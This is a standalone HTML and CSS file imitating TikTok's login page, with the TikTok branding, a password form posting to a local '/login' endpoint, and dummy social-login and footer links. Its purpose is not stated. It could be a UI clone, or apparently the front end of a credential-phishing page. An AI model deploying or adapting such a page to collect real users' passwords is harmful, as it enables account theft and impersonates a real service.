<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            color: #ffffff;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px auto;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #ff0050, #00f2ea);
        }
        .logo i {
            font-size: 40px;
            color: white;
        }
        .tiktok-text {
            font-size: 32px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 30px;
        }
        .card {
            background: #121212;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border-radius: 8px;
            border: 1px solid #333333;
            font-size: 16px;
            background: #000000;
            color: #ffffff;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #888888;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #ff0050;
            outline: none;
        }
        .login-btn {
            background-color: #ff0050;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 14px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #e00045;
        }
        .login-btn:active {
            transform: scale(0.98);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #888888;
            font-size: 14px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333333;
        }
        .divider::before {
            margin-right: 16px;
        }
        .divider::after {
            margin-left: 16px;
        }
        .other-options {
            text-align: center;
            margin-bottom: 20px;
        }
        .option-link {
            color: #ff0050;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
        }
        .signup-section {
            background: #121212;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
        }
        .signup-text {
            color: #ffffff;
            font-size: 14px;
        }
        .signup-link {
            color: #ff0050;
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
            color: #888888;
            font-size: 12px;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #888888;
            text-decoration: none;
            margin: 0 8px;
        }
        .language-selector {
            margin-top: 10px;
        }
        .language-selector select {
            background: #000000;
            color: #ffffff;
            border: 1px solid #333333;
            border-radius: 4px;
            padding: 4px 8px;
        }
        .social-login {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        .social-btn {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #333333;
            color: white;
            text-decoration: none;
            font-size: 18px;
            transition: transform 0.3s;
        }
        .social-btn:hover {
            transform: scale(1.1);
        }
        .facebook { background: #1877f2; }
        .google { background: #db4437; }
        .twitter { background: #1da1f2; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fab fa-tiktok"></i>
            </div>
            <div class="tiktok-text">TikTok</div>
        </div>

        <div class="card">
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Email or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="divider">OR</div>

            <div class="social-login">
                <a href="#" class="social-btn facebook"><i class="fab fa-facebook-f"></i></a>
                <a href="#" class="social-btn google"><i class="fab fa-google"></i></a>
                <a href="#" class="social-btn twitter"><i class="fab fa-twitter"></i></a>
            </div>

            <div class="other-options">
                <a href="#" class="option-link">Use phone / email / username</a>
                <a href="#" class="option-link">Log in with QR code</a>
                <a href="#" class="option-link">Forgot password?</a>
            </div>
        </div>

        <div class="signup-section">
            <span class="signup-text">Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">About</a>
            <a href="#">Newsroom</a>
            <a href="#">Contact</a>
            <a href="#">Careers</a>
            <a href="#">ByteDance</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English</option>
                <option>ខ្មែរ</option>
                <option>中文</option>
            </select>
        </div>
        <div>© 2025 TikTok</div>
    </div>
</body>
</html>
